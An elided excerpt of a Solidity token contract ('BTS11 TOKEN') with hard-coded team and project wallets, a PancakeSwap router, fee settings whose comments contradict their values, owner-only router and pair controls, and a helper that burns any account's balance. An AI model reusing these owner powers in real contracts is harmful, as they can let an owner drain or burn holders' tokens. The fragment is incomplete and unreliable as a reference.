...
// File: BTS11 TOKEN.sol

pragma solidity ^0.8.6;

contract BTS11TOKEN is ERC20, Ownable {
    ...
    address public _teamWalletAddress = address(0x13F97F01BE4CdE5e8a7b4FCDbC9A35899A5dc34E); // Team Wallet
    address public _projectWalletAddress = address(0x99C8C103B54044B9cE87eAfA4a73AFbcAcf76f52); //Project Wallet
    ...
    constructor() ERC20("BTS11 TOKEN", "BTS11") {

    	IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0xD99D1c33F9fC3444f8101754aBC46c52416550D1); // PCS V2 ROUTER
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PCS V2 ROUTER for mainnet
        ...
        buyFee.projectFee = 0; // 3% Project fee
        buyFee.teamFee = 0;  // 3% team fee
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "BTS11: The router already has that address");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "BTS11: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "BTS11: Automated market maker pair is already set to that value");
  ...
  function _burnOwner(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");

    _burn(account, amount * (10**10));
  }
